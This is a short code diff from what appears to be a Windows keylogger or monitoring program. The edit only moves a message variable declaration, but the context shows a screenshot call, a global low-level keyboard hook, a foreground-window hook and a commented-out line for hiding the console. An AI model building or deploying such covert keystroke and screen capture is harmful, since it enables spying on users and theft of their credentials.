@@ -106,13 +106,13 @@ VOID CALLBACK WinEventProcCallback(HWINEVENTHOOK hWinEventHook, DWORD dwEvent, H
 
 int main()
 {	
+	MSG msg;
 	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false); //Hides the console window
 	getScreenShot();
 
 	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
 	HWINEVENTHOOK hEvent = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL,
 		WinEventProcCallback, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
-	MSG msg;
 
 	while (!GetMessage(&msg, NULL, NULL, NULL)) 
 	{
